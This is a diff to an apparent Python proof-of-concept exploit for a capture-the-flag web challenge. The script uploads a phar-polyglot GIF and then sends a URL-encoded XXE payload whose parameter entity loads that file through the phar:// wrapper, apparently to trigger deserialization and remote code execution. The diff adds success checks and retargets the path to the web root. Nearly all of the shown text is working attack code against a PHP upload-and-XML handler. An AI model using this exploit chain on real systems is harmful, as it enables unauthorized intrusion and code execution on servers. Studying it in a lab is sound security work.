@@ -1,5 +1,6 @@
 #!/usr/bin/python3
 
+# PoC for Challenge
 # William Moody
 # 10.04.2021
 
@@ -24,14 +25,22 @@ f = {"image":("poc.gif", phar_img, "image/gif")}
 r = requests.post('http://%s'%RHOST,
     files=f)
 
+if 'Uploaded' not in r.text:
+    print("[-] Failed")
+    sys.exit(-1)
+
 print("[*] POST'ing XML...")
 payload = urllib.parse.quote('<!DOCTYPE foo [<!ELEMENT foo ANY>'+\
-    '<!ENTITY % xxe SYSTEM "phar:///home/bill/Pen/ctf/247ctf/web/phar_rce/images/poc.gif">%xxe;]><message><to></to><from></from>'+\
+    '<!ENTITY % xxe SYSTEM "phar:///var/www/html/images/poc.gif">%xxe;]><message><to></to><from></from>'+\
     '<title></title><body>F</body></message>')
 r = requests.post('http://%s'%RHOST,
     data='message='+payload,
     headers={'Content-Type':'application/x-www-form-urlencoded'}
 )
+
+if 'saved!' not in r.text:
+    print("[-] Failed")
+    sys.exit(-1)
 
 print("[*] Removing phar/image...")
 subprocess.Popen(["rm","poc.phar"])
